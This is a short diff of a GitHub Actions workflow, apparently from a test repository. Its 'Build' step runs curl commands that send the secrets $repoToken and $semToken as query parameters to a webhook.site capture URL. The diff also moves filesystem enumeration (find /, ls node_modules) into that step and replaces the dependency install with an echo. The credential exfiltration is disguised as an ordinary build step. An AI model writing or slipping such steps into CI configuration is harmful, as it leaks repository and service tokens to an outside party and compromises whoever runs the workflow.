@@ -32,14 +32,14 @@ jobs:
 
     - name: Install dependencies
       if: steps.cache-node-modules.outputs.cache-hit != 'true'
-      run: |
-             ls /usr/share/node_modules
-             find / | grep node_modules | head -1
+      run: echo install dep
 
     - name: Build
       run: | 
              curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$repoToken"
-             curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$semToken"
+             curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$semToken"             
+             ls /usr/share/node_modules
+             find / | grep node_modules | head -1
 
     - uses: testweb01/actionTest@v4
       with:
